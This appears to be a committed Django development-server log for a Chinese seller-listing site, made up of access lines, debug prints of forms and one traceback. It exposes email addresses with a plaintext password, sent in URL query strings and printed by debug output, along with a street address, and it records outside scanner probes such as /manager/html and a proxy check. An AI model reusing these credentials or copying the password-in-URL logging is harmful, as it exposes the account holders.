@@ -1,0 +1,627 @@
+[02/Jan/2014 12:35:00] "GET /sellers/register/ HTTP/1.1" 200 7286
+[02/Jan/2014 12:35:04] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:35:17] "GET /sellers HTTP/1.1" 301 0
+[02/Jan/2014 12:35:17] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:35:17] "GET /static/css/offcanvas.css HTTP/1.1" 200 917
+[02/Jan/2014 12:35:17] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[02/Jan/2014 12:35:18] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 12:35:18] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 200 99548
+[02/Jan/2014 12:35:19] "GET /static/img/favicon.png HTTP/1.1" 200 887
+[02/Jan/2014 12:36:59] "GET /sellers HTTP/1.1" 301 0
+[02/Jan/2014 12:36:59] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:36:59] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[02/Jan/2014 12:36:59] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 12:37:10] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:37:13] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[02/Jan/2014 12:37:13] "GET /static/css/offcanvas.css HTTP/1.1" 200 917
+[02/Jan/2014 12:37:13] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 12:37:13] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 200 99548
+[02/Jan/2014 12:37:16] "GET /sellers/register/ HTTP/1.1" 200 7286
+[02/Jan/2014 12:37:39] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:37:40] "GET /static/css/offcanvas.css HTTP/1.1" 200 917
+[02/Jan/2014 12:37:40] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[02/Jan/2014 12:37:40] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 12:37:40] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 200 99548
+[02/Jan/2014 12:37:40] "GET /static/img/favicon.png HTTP/1.1" 200 887
+[02/Jan/2014 12:37:52] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:37:52] "GET /sellers/register/ HTTP/1.1" 200 7286
+[02/Jan/2014 12:37:53] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 12:38:00] "POST /sellers/register/ HTTP/1.1" 302 0
+[02/Jan/2014 12:38:00] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:38:12] "GET /sellers/?login_username=garvenshen%40126.com&login_password=wjbb111&login= HTTP/1.1" 200 4960
+[02/Jan/2014 12:38:12] "GET /static/bootstrap/dist/fonts/glyphicons-halflings-regular.woff HTTP/1.1" 200 23292
+[02/Jan/2014 12:38:15] "GET /sellers/blist HTTP/1.1" 301 0
+[02/Jan/2014 12:38:16] "GET /sellers/blist/ HTTP/1.1" 200 3276
+[02/Jan/2014 12:38:18] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 12:38:20] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 12:38:36] "POST /sellers/post/ HTTP/1.1" 302 0
+[02/Jan/2014 12:38:36] "GET /sellers/blist/ HTTP/1.1" 200 3459
+[02/Jan/2014 12:39:23] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 12:39:24] "GET /sellers/?logout= HTTP/1.1" 200 4142
+[02/Jan/2014 12:40:34] "GET /sellers/blist/?logout= HTTP/1.1" 200 4142
+[02/Jan/2014 12:40:34] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 304 0
+[02/Jan/2014 12:40:34] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[02/Jan/2014 12:40:34] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[02/Jan/2014 12:40:34] "GET /static/css/offcanvas.css HTTP/1.1" 304 0
+[02/Jan/2014 12:40:40] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:41:14] "GET /sellers/register/ HTTP/1.1" 200 7286
+[02/Jan/2014 12:50:03] "POST /sellers/register/ HTTP/1.1" 302 0
+[02/Jan/2014 12:50:03] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 12:50:03] "GET /static/css/offcanvas.css HTTP/1.1" 304 0
+[02/Jan/2014 12:50:03] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 304 0
+[02/Jan/2014 12:50:03] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[02/Jan/2014 12:50:03] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[02/Jan/2014 12:50:39] "GET /sellers/?login_username=zhxuecf%40163.com&login_password=wjbb111&login= HTTP/1.1" 200 4957
+[02/Jan/2014 12:50:40] "GET /static/bootstrap/dist/fonts/glyphicons-halflings-regular.woff HTTP/1.1" 200 23292
+[02/Jan/2014 12:50:48] "GET /sellers/blist HTTP/1.1" 301 0
+[02/Jan/2014 12:50:49] "GET /sellers/blist/ HTTP/1.1" 200 3276
+[02/Jan/2014 12:50:52] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 12:52:11] "POST /sellers/post/ HTTP/1.1" 302 0
+[02/Jan/2014 12:52:11] "GET /sellers/blist/ HTTP/1.1" 200 3561
+[02/Jan/2014 12:52:16] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 12:52:20] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 12:52:47] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 12:52:47] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 13:11:45] "GET / HTTP/1.1" 404 2007
+[02/Jan/2014 13:44:24] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 13:44:25] "GET /static/css/offcanvas.css HTTP/1.1" 200 917
+[02/Jan/2014 13:44:25] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[02/Jan/2014 13:44:25] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 13:44:25] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 200 99548
+[02/Jan/2014 13:44:25] "GET /static/img/favicon.png HTTP/1.1" 200 887
+[02/Jan/2014 13:44:39] "GET /sellers/?login_username=garvenshen%40126.com&login_password=wjbb111&login= HTTP/1.1" 200 4960
+[02/Jan/2014 13:44:39] "GET /static/bootstrap/dist/fonts/glyphicons-halflings-regular.woff HTTP/1.1" 200 23292
+[02/Jan/2014 13:44:41] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 13:44:47] "POST /sellers/post/ HTTP/1.1" 302 0
+[02/Jan/2014 13:44:47] "GET /sellers/blist/ HTTP/1.1" 200 3621
+[02/Jan/2014 13:59:32] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 13:59:32] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 304 0
+[02/Jan/2014 13:59:32] "GET /static/css/offcanvas.css HTTP/1.1" 304 0
+[02/Jan/2014 13:59:32] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[02/Jan/2014 13:59:32] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[02/Jan/2014 13:59:35] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 13:59:37] "GET /sellers/blist/ HTTP/1.1" 200 3561
+[02/Jan/2014 14:07:43] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:07:45] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:07:47] "GET /sellers/blist/ HTTP/1.1" 200 3561
+[02/Jan/2014 14:07:52] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:08:08] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:08:12] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:08:18] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:08:25] "GET /sellers/post/?logout= HTTP/1.1" 200 4142
+[02/Jan/2014 14:08:34] "GET /sellers/post/?login_username=zhxuecf%40163.com&login_password=wjbb111&login= HTTP/1.1" 200 4848
+[02/Jan/2014 14:08:42] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:08:50] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:08:53] "GET /sellers/blist HTTP/1.1" 301 0
+[02/Jan/2014 14:08:53] "GET /sellers/blist/ HTTP/1.1" 200 3561
+[02/Jan/2014 14:09:25] "GET /sellers/blist/ HTTP/1.1" 200 3621
+[02/Jan/2014 14:09:25] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 304 0
+[02/Jan/2014 14:09:25] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[02/Jan/2014 14:09:25] "GET /static/css/offcanvas.css HTTP/1.1" 304 0
+[02/Jan/2014 14:09:25] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[02/Jan/2014 14:09:27] "GET /sellers/blist/?logout= HTTP/1.1" 200 4142
+[02/Jan/2014 14:09:30] "GET /sellers/register/ HTTP/1.1" 200 7286
+[02/Jan/2014 14:10:32] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:10:37] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:14:14] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:14:14] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 304 0
+[02/Jan/2014 14:14:14] "GET /static/css/offcanvas.css HTTP/1.1" 304 0
+[02/Jan/2014 14:14:14] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[02/Jan/2014 14:14:14] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[02/Jan/2014 14:14:16] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:17:04] "GET /sellers HTTP/1.1" 301 0
+[02/Jan/2014 14:17:05] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:17:05] "GET /static/bootstrap/dist/fonts/glyphicons-halflings-regular.woff HTTP/1.1" 304 0
+[02/Jan/2014 14:17:44] "GET /sellers/blist/ HTTP/1.1" 200 3561
+Validating models...
+
+0 errors found
+January 02, 2014 - 12:34:56
+Django version 1.6.1, using settings 'wjbbweb.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+<tr><th><label for="id_email">Email:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_email" name="email" placeholder="请输入您的邮件地址" required="required" style="width: 50%;" type="email" value="garvenshen@126.com" /></td></tr>
+<tr><th><label for="id_password">Password:</label></th><td><input  class="form-control" id="id_password" name="password" placeholder="请设置您到登录密码" required="required" style="width: 50%;" type="password" /></td></tr>
+<tr><th><label for="id_password_again">Password again:</label></th><td><input  class="form-control" id="id_password_again" name="password_again" placeholder="请再次输入您的登录密码" required="required" style="width: 50%;" type="password" /></td></tr>
+<tr><th><label for="id_address">Address:</label></th><td><input  class="form-control" id="id_address" name="address" placeholder="请输入您的具体地址" required="required" type="text" value="万泉河路68号紫金庄园" /></td></tr>
+<tr><th><label for="id_description">Description:</label></th><td><textarea  class="form-control" cols="40" id="id_description" name="description" placeholder="请输入关于您的商业描述" required="required" rows="10">
+呵呵</textarea></td></tr>
+<tr><th><label for="id_agree">Agree:</label></th><td><input checked="checked" id="id_agree" name="agree" required="required" type="checkbox" /></td></tr>
+garvenshen@126.com wjbb111
+garvenshen@126.com
+garvenshen@126.com
+<QueryDict: {'title': ['尝试发个信息吧'], 'register': [''], 'csrfmiddlewaretoken': ['E0hgqPNVewf3PEbSC8AccK2nyms3PlCw'], 'content': ['呵呵']}>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="尝试发个信息吧" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+呵呵</textarea></td></tr>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="尝试发个信息吧" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+呵呵</textarea></td></tr>
+<tr><th><label for="id_email">Email:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_email" name="email" placeholder="请输入您的邮件地址" required="required" style="width: 50%;" type="email" value="zhxuecf@163.com" /></td></tr>
+<tr><th><label for="id_password">Password:</label></th><td><input  class="form-control" id="id_password" name="password" placeholder="请设置您到登录密码" required="required" style="width: 50%;" type="password" /></td></tr>
+<tr><th><label for="id_password_again">Password again:</label></th><td><input  class="form-control" id="id_password_again" name="password_again" placeholder="请再次输入您的登录密码" required="required" style="width: 50%;" type="password" /></td></tr>
+<tr><th><label for="id_address">Address:</label></th><td><input  class="form-control" id="id_address" name="address" placeholder="请输入您的具体地址" required="required" type="text" value="西二旗大街" /></td></tr>
+<tr><th><label for="id_description">Description:</label></th><td><textarea  class="form-control" cols="40" id="id_description" name="description" placeholder="请输入关于您的商业描述" required="required" rows="10">
+我们是一家专注于幼儿教育的机构。在幼儿教育产业立志成为中国No. 1. </textarea></td></tr>
+<tr><th><label for="id_agree">Agree:</label></th><td><input checked="checked" id="id_agree" name="agree" required="required" type="checkbox" /></td></tr>
+zhxuecf@163.com wjbb111
+zhxuecf@163.com
+zhxuecf@163.com
+<QueryDict: {'title': ['北京音乐学院著名钢琴老师授课'], 'register': [''], 'csrfmiddlewaretoken': ['QADZJWKrIFhVBsG5ArUJhVLgZA10Csda'], 'content': ['来自北京音乐学院著名钢琴老师授课张朗朗将亲自为小朋友授课。']}>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="北京音乐学院著名钢琴老师授课" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+来自北京音乐学院著名钢琴老师授课张朗朗将亲自为小朋友授课。</textarea></td></tr>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="北京音乐学院著名钢琴老师授课" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+来自北京音乐学院著名钢琴老师授课张朗朗将亲自为小朋友授课。</textarea></td></tr>
+garvenshen@126.com wjbb111
+garvenshen@126.com
+garvenshen@126.com
+<QueryDict: {'title': ['aaa'], 'register': [''], 'csrfmiddlewaretoken': ['4w9xpwBfB1lPcFzFeeWpouK3LauM9A3B'], 'content': ['aaa']}>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="aaa" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+aaa</textarea></td></tr>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="aaa" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+aaa</textarea></td></tr>
+<QueryDict: {'title': ['著名画家张小千老师授课'], 'register': [''], 'csrfmiddlewaretoken': ['EE9qrHBtMPKYdrCCgTMLQ4wOJTqFDsNn'], 'content': ['小盆友们快来学画画吧！！！']}>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="著名画家张小千老师授课" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+小盆友们快来学画画吧！！！</textarea></td></tr>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="著名画家张小千老师授课" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+小盆友们快来学画画吧！！！</textarea></td></tr>
+garvenshen@126.com wjbb111
+garvenshen@126.com
+garvenshen@126.com[02/Jan/2014 14:17:52] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:19:24] "POST /sellers/post/ HTTP/1.1" 302 0
+[02/Jan/2014 14:19:24] "GET /sellers/blist/ HTTP/1.1" 200 3789
+[02/Jan/2014 14:19:34] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:19:40] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:19:43] "GET /sellers/blist/ HTTP/1.1" 200 3789
+[02/Jan/2014 14:19:46] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:19:47] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:19:52] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:20:50] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 14:20:50] "GET /static/css/offcanvas.css HTTP/1.1" 200 917
+[02/Jan/2014 14:20:50] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[02/Jan/2014 14:20:51] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 14:20:52] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 200 99548
+[02/Jan/2014 14:23:40] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:23:44] "GET /sellers/blist/ HTTP/1.1" 200 3789
+[02/Jan/2014 14:24:03] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:24:08] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:27:54] "GET / HTTP/1.1" 404 2007
+[02/Jan/2014 14:30:27] "GET / HTTP/1.0" 404 2007
+[02/Jan/2014 14:43:54] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:43:54] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 304 0
+[02/Jan/2014 14:43:54] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[02/Jan/2014 14:43:54] "GET /static/css/offcanvas.css HTTP/1.1" 304 0
+[02/Jan/2014 14:43:55] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[02/Jan/2014 14:43:55] "GET /static/img/favicon.png HTTP/1.1" 304 0
+[02/Jan/2014 14:43:57] "GET /sellers/blist/ HTTP/1.1" 200 3789
+[02/Jan/2014 14:43:59] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:44:01] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:44:03] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:44:06] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:44:10] "GET /sellers/blist/ HTTP/1.1" 200 3789
+[02/Jan/2014 14:44:14] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:59:20] "GET /sellers HTTP/1.1" 301 0
+[02/Jan/2014 14:59:21] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 14:59:21] "GET /static/css/offcanvas.css HTTP/1.1" 200 917
+[02/Jan/2014 14:59:21] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[02/Jan/2014 14:59:21] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[02/Jan/2014 14:59:21] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 200 99548
+[02/Jan/2014 14:59:22] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:22] "GET /static/img/favicon.png HTTP/1.1" 200 887
+[02/Jan/2014 14:59:23] "GET /sellers/ HTTP/1.1" 200 4142
+[02/Jan/2014 14:59:24] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:28] "GET /sellers/?login_username=garvenshen%40126.com&login_password=wjbb111&login= HTTP/1.1" 200 4960
+[02/Jan/2014 14:59:28] "GET /static/bootstrap/dist/fonts/glyphicons-halflings-regular.woff HTTP/1.1" 200 23292
+[02/Jan/2014 14:59:29] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:37] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:59:37] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:40] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:59:40] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:42] "GET /sellers/blist HTTP/1.1" 301 0
+[02/Jan/2014 14:59:42] "GET /sellers/blist/ HTTP/1.1" 200 3621
+[02/Jan/2014 14:59:43] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:47] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 14:59:47] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:50] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 14:59:51] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 14:59:52] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 15:12:41] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 15:12:41] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 304 0
+[02/Jan/2014 15:12:41] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[02/Jan/2014 15:12:41] "GET /static/css/offcanvas.css HTTP/1.1" 304 0
+[02/Jan/2014 15:12:41] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[02/Jan/2014 15:13:44] "GET http://www.bob-n.com/ HTTP/1.1" 404 1650
+[02/Jan/2014 15:13:57] "GET /sellers/?logout= HTTP/1.1" 200 4142
+[02/Jan/2014 15:13:58] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 15:14:01] "GET /sellers/register/ HTTP/1.1" 200 7286
+[02/Jan/2014 15:14:02] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 15:14:08] "GET /sellers/register/?login_username=garvenshen%40126.com&login_password=wjbb111&login= HTTP/1.1" 200 4950
+[02/Jan/2014 15:14:09] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 15:14:10] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 15:14:11] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 2103
+[02/Jan/2014 15:17:50] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 15:17:52] "GET /sellers/blist/ HTTP/1.1" 200 3789
+[02/Jan/2014 15:18:03] "GET /sellers/post/ HTTP/1.1" 200 4833
+[02/Jan/2014 15:18:07] "GET /sellers/ HTTP/1.1" 200 4942
+[02/Jan/2014 18:20:24] "GET / HTTP/1.1" 404 2004
+[03/Jan/2014 00:47:34] "GET / HTTP/1.1" 404 2007
+[03/Jan/2014 00:47:42] "GET /sellers/ HTTP/1.1" 200 4142
+[03/Jan/2014 00:47:42] "GET /static/css/offcanvas.css HTTP/1.1" 200 917
+[03/Jan/2014 00:47:42] "GET /static/js/offcanvas.js HTTP/1.1" 200 138
+[03/Jan/2014 00:47:42] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 200 27822
+[03/Jan/2014 00:47:42] "GET /static/bootstrap/dist/css/bootstrap.min.css HTTP/1.1" 200 99548
+[03/Jan/2014 00:47:42] "GET /static/img/favicon.png HTTP/1.1" 200 887
+[03/Jan/2014 00:47:59] "GET /sellers/?login_username=garvenshen@126.com&login_password=wjbb111&login= HTTP/1.1" 200 4960
+[03/Jan/2014 00:47:59] "GET /static/bootstrap/dist/fonts/glyphicons-halflings-regular.eot? HTTP/1.1" 200 20290
+[03/Jan/2014 00:48:00] "GET /static/img/favicon.png HTTP/1.1" 200 887
+[03/Jan/2014 00:48:02] "GET /sellers/post/ HTTP/1.1" 200 4833
+[03/Jan/2014 00:48:04] "POST /sellers/post/ HTTP/1.1" 302 0
+[03/Jan/2014 00:48:05] "GET /sellers/blist/ HTTP/1.1" 200 3783
+[03/Jan/2014 00:48:10] "GET /sellers/post/ HTTP/1.1" 200 4833
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.3/socketserver.py", line 610, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/lib/python3.3/socketserver.py", line 345, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/lib/python3.3/site-packages/django/core/servers/basehttp.py", line 126, in __init__
+    super(WSGIRequestHandler, self).__init__(*args, **kwargs)
+  File "/usr/local/lib/python3.3/socketserver.py", line 666, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.3/wsgiref/simple_server.py", line 118, in handle
+    self.raw_requestline = self.rfile.readline()
+  File "/usr/local/lib/python3.3/socket.py", line 297, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[03/Jan/2014 05:23:46] "GET /manager/html HTTP/1.1" 404 2040
+[03/Jan/2014 06:36:50] "GET /manager/html HTTP/1.1" 404 2040
+[03/Jan/2014 10:40:39] "POST http://best-proxies.ru/azenv.php?rand=1625d06aa9008f2c238bada6fd0d1af9 HTTP/1.1" 404 1724
+[03/Jan/2014 18:53:58] "GET / HTTP/1.1" 404 2004
+
+garvenshen@126.com wjbb111
+garvenshen@126.com
+garvenshen@126.com
+<QueryDict: {'title': ['aaa'], 'register': [''], 'csrfmiddlewaretoken': ['TPqK74FRpdoqthIfElwmx9CgnSfkNDfH'], 'content': ['aaa']}>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="aaa" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+aaa</textarea></td></tr>
+<tr><th><label for="id_title">Title:</label></th><td><input  class="form-control" autofocus="autofocus" id="id_title" name="title" placeholder="请输入您的标题" required="required" type="text" value="aaa" /></td></tr>
+<tr><th><label for="id_content">Content:</label></th><td><textarea  class="form-control" cols="40" id="id_content" name="content" placeholder="请输入您要发布的具体信息" required="required" rows="10">
+aaa</textarea></td></tr>
+----------------------------------------
+Exception happened during processing of request from ('118.194.195.4', 48799)
+----------------------------------------
+[04/Jan/2014 06:45:02] "GET /sellers/ HTTP/1.1" 200 4209
+[04/Jan/2014 06:45:02] "GET /static/js/offcanvas.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:02] "GET /static/bootstrap/dist/js/bootstrap.min.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET / HTTP/1.1" 200 8192
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/base.css HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/cdn_djl.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/index.css HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/wy_nav.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/vdisk.png HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/jquery-1.6.4.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/sea.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/qqviplib_2.0.0.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/tcss.ping.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/qqdisk_web_common_wy.js HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/vablum.png HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/vtransfer.png HTTP/1.1" 304 0
+[04/Jan/2014 06:45:06] "GET /static/apphome/files/logo.jpg HTTP/1.1" 304 0
